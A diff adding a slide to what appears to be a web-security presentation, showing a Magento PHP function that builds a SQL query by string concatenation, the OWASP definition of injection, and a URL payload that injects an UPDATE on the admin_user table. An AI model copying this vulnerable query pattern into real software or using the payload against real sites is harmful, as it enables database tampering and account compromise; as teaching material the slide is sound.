@@ -135,6 +135,45 @@
 						<p>View customer name, address, phone number, quote items, price, date created for any quote 😎</p>
 					</section>
 				</section>
+				<!-- 5. Exhibit C -->
+				<section>
+					<section>
+						<h1>Exhibit C</h1>
+					</section>
+					<section data-markdown>
+						### The Code
+						```
+						function getSuggestions() {
+							$con = Mage::getSingleton('core/resource')
+								->getConnection('core_read');
+
+							$q = Mage::app()->getRequest()->getParam('q');
+
+							$query = 'SELECT content FROM cms_page' .
+								' WHERE title LIKE \'%' . $q .'%\'';
+
+							$results = $con->fetchAll($query);
+
+							return $results;
+						}
+						```
+					</section>
+					<section>
+						<h3>Injection</h3>
+						<p>Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.</p>
+						<p><em>#1 on 2013 OWASP Top 10</em></p>
+					</section>
+					<section data-markdown>
+						### Exploitation
+						```
+						http://example.com/suggestions/?q=hello%%27);UPDATE%20admin_user%20SET%20firstname%20=%20pwned2%20WHERE%20username%20=%20admin;--
+						```
+					</section>
+					<section>
+						<h3> The Result</h3>
+						<p>Run any SQL query you'd like against the target 😜</p>
+					</section>
+				</section>
 			</div>
 		</div>
 
